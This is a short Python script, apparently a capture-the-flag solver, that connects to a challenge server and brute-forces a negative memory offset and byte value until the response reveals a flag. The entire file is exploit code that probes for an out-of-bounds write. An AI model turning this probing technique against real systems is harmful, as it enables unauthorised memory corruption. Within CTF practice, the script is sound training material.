import sys, re, time, socket, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = open(r"D:\ctf-index\_z_146url.txt").read().split()
port = int(port)
print("cible:", host, port, flush=True)


def attempt(offset, value, wait=0.45):
    try:
        s = socket.create_connection((host, port), timeout=6)
        s.settimeout(wait)
    except Exception:
        return None
    try:
        s.sendall(str(offset).encode() + b"\n" + bytes([value]))
        out = b""
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
                if b"Address: " in out and len(out) > 40:
                    break
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


base = attempt(0, ord("A"))
print("temoin:", repr((base or "")[:110]), flush=True)
hits = []
t0 = time.time()
for off in range(-4400, -5601, -16):
    r = attempt(off, 0x00)
    if r is None:
        continue
    if "random string" not in r:
        hits.append((off, r))
        print("HIT %d -> %r" % (off, r[:90].replace("\n", " ")), flush=True)
        if len(hits) >= 1:
            break
print("phase1: %d hits en %.0fs" % (len(hits), time.time() - t0), flush=True)
if hits:
    off = hits[0][0]
    print("phase2 sur offset %d" % off, flush=True)
    for v in range(0, 256, 16):
        r = attempt(off, v)
        if r is None:
            continue
        ok = ("Congrats" in r) or ("academy{" in r)
        print("  val=0x%02x -> %r %s" % (v, r[:80].replace("\n", " "), "OK" if ok else ""), flush=True)
        if ok:
            m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r)
            print("FLAG:", m.group(0) if m else None)
            break
